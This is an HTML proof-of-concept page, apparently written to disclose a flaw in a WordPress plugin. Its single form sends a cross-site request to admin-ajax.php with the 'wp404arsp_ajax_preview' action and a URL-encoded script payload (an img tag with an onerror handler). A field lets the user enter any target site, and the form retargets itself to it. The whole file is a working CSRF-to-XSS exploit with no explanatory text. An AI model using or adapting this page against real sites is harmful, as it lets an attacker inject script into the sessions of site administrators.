<!DOCTYPE html>
<html>
   <body>
      <h1>CSRF PoC</h1>
      <form action="/wp-admin/admin-ajax.php" method="POST" name=form1 id=form1>
	Enter your target:
	 <input id=target name=target placeholder="https://yourserver:1337">
         <input type="hidden" name="action" value="wp404arsp_ajax_preview" />
         <input type="hidden" name="request" value="%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E" />
	 <input type="submit" onclick="form1.setAttribute('action', form1.target.value+form1.getAttribute('action'))" value="Submit request" />
      </form>
   </body>
</html>
